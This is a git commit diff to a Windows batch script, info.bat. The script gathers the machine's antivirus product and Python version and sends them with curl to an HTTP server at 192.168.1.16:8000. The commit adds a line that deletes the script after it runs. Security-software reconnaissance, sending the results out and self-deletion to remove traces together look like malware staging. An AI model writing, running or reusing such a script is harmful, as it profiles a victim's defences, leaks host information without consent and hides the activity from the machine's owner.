a83f2ad5cabe3db9e64794e0125f26220cd413ff
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-07 00:17:37 +0300

    Update info.bat

--- info.bat
+++ info.bat
@@ -7,3 +7,5 @@ for /f "delims=" %%b in ('python --version 2^>^&1') do (
     set "python_version=%%b"
 )
 curl --verbose --get --data-urlencode "Antivirus=!antivirus!" --data-urlencode "PythonVersion=!python_version!" http://192.168.1.16:8000
+del "%~f0"
+
